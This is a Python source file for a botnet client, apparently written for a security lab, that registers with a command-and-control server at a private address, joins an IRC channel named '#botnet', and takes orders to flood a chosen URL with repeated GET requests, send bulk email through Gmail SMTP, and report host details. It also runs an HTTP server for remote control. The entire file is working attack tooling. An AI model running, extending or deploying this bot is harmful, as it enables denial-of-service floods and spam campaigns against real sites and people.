import concurrent
import socket
from http.server import BaseHTTPRequestHandler, HTTPServer
from concurrent.futures import ThreadPoolExecutor
import json
import platform
import smtplib
import ssl
import threading
from email.mime.text import MIMEText
from http.server import BaseHTTPRequestHandler
from urllib.error import HTTPError
from urllib.request import Request, urlopen

target = "-"
action = "waiting"
event = threading.Event()


def sendMessage(s, message):
    s.send(bytes(f"{message}\r\n", "UTF-8"))


def readMessage(s):
    buff = s.recv(4096).decode("UTF-8")
    message = buff.split("\r\n")
    for m in message:
        if m.startswith("PING"):
            sendMessage(s, "PONG :botnet.sicurezza.com")
        if m.startswith(":cc!cc"):
            print(m)
            if "PING" in m:
                sendMessage(s, f"PRIVMSG cc #botnet: PONG")
                continue
            comando = m[m.index(":#botnet: ")+10::]
            comando = comando.split("|")
            if comando[0] == "get":
                target, action = execRequest(comando[1],comando[2])
                sendMessage(s, f"PRIVMSG cc #botnet: info|{target}|{action}")

            elif comando[0] == "stop":
                target, action = stopAttack()
                sendMessage(s, f"PRIVMSG cc #botnet: info|{target}|{action}")

            elif comando[0] == "systemInfo":
                m = getSystemInfo()
                sendMessage(s, f"PRIVMSG cc #botnet: systemInfo|{m}")

            elif comando[0] == "send":
                target, action = batchEmail(comando[1],comando[2],comando[3])
                sendMessage(s, f"PRIVMSG cc #botnet: info|{target}|{action}")
                return
            elif comando[0] == "status":
                target, action = getStatus()
                sendMessage(s, f"PRIVMSG cc #botnet: info|{target}|{action}")


def batchEmail(oggetto, message, utenti):
    global target
    global action
    ut = None
    if "[" in utenti and "]" in utenti and "," in utenti:
        ut = utenti.strip("[]").split(",")
    try:
        p = threading.Thread(target=sendEmail, args=(oggetto, message, ut if ut is not None else utenti))
        p.daemon = True
        p.start()
    except Exception as e:
        print(e)
    target = len(ut) if ut is not None else len(utenti)
    action = "Sending email to " + str(target) + " users"
    return target, action


def execRequest(url, time):
    global target
    global action
    global event
    if event.is_set():
        event.clear()
    try:
        p = threading.Thread(target=doRequest, args=(url, int(time)))
        p.daemon = True
        p.start()
    except Exception as e:
        print(e)
    target = url
    action = "Get " + str(time) + " times"
    return target, action


def stopAttack():
    global target
    global action
    event.set()
    target = "-"
    action = "waiting"
    return target, action


def getSystemInfo():
    try:
        uname = platform.uname()
        message = {
            "System": uname.system,
            "Node name": uname.node,
            "Release": uname.release,
            "Version": uname.version,
            "Machine": uname.machine,
        }
        return json.dumps(message)
    except Exception as e:
        print(e)
        return json.dumps({"Error": "Information not available"})


def doRequest(url, time):
    global target
    global action
    global event
    i = 0

    while (i < time or time == -1) and not event.is_set():
        try:
            print("Get to", url)
            req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            urlopen(req, timeout=10).read()
        except TimeoutError as e:
            print("--> Request error:", url, "is not reachable")
        except HTTPError as e:
            print("--> Request error:", url, "is not reachable:", e)

        if time != -1:
            i += 1
    target = "-"
    action = "waiting"


def sendEmail(oggetto, message, utenti):
    smtp_server = "smtp.gmail.com"
    port = 465
    password = ""
    sender = ""
    context = ssl.create_default_context()
    try:
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender, password)
            msg = MIMEText(message)
            msg['Subject'] = oggetto
            msg['From'] = sender
            for u in utenti:
                print("Sending email to", u)
                if "'" in u:
                    u = u.replace("'", "")
                msg['To'] = u
                server.sendmail(sender, u, msg.as_string())
    except Exception as e:
        print("Sending error:", e)


def getStatus():
    global target
    global action
    return target, action


class HTTPServerRH(BaseHTTPRequestHandler):

    # def log_message(self, format, *args):
    #    return

    def do_GET(self):
        global target
        global action
        if self.path == "/status":
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            message = {"target": target, "action": action}
            self.wfile.write(json.dumps(message).encode('utf-8'))
            return
        if self.path == "/stopAttack":
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            stopAttack()
            message = {"target": target, "action": action}
            self.wfile.write(json.dumps(message).encode('utf-8'))
            return
        elif self.path == "/getSystemInfo":
            target = "-"
            action = "System info"
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(getSystemInfo().encode('utf-8'))
            return

    def do_POST(self):
        global target
        global action

        contentLength = int(self.headers['Content-Length'])
        postData = self.rfile.read(contentLength).decode("utf-8")
        req = json.loads(postData)
        if self.path == "/doGet":
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            execRequest(req["url"], req["time"])
            message = {"target": target, "action": action}
            self.wfile.write(json.dumps(message).encode('utf-8'))
            return
        if self.path == "/sendEmail":
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            batchEmail(req['oggetto'], req['messaggio'], req['utenti'])
            message = {"target": target, "action": action}
            self.wfile.write(json.dumps(message).encode('utf-8'))
            return


class Bot:
    myIp = None
    host = '10.0.2.10'
    port = 49171
    httpPort = 80
    ircPort = 6667

    def __init__(self):
        res = self.sendInfo()
        if res == False:
            print("C&C is not reachable!")
            return
        task = []
        with ThreadPoolExecutor(max_workers=2) as exec:
            task.append(exec.submit(self.httpServer))
            task.append(exec.submit(self.ircConnection))
            done, not_done = concurrent.futures.wait(task, return_when=concurrent.futures.FIRST_COMPLETED)
            exec.shutdown(wait=False)

    def sendInfo(self):
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
            self.myIp = s.getsockname()[0]
            message = self.myIp + ' {"http":' + str(self.httpPort) + ',"irc":' + str(
                self.ircPort) + ',"target":"-","action":"waiting"}'
            while message != 'bot registrated succesfully':
                s.send(message.encode())
                message = s.recv(1024).decode()
            s.close()
        except Exception as e:
            print("Information send error: ", e)
            return False
        finally:
            s.close()

    def httpServer(self):
        httpd = None
        try:
            httpd = HTTPServer((self.myIp, 80), HTTPServerRH)
            httpd.serve_forever()
        except Exception as e:
            print("HTTP error: ", e)
            httpd.shutdown()

    def ircConnection(self):
        NICKNAME = "bot-"+self.myIp.replace(".","-")
        CHANNEL = "#botnet"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.ircPort))
            s.send(bytes(f"NICK {NICKNAME}\r\n", "UTF-8"))
            s.send(bytes(f"USER {NICKNAME} {self.myIp} {NICKNAME} :{NICKNAME}:\r\n", "UTF-8"))

            sendMessage(s, f"JOIN {CHANNEL}\r\n")

            while True:
                readMessage(s)
        except Exception as e:
            print("IRC error:",e)


if __name__ == '__main__':
    b = Bot()
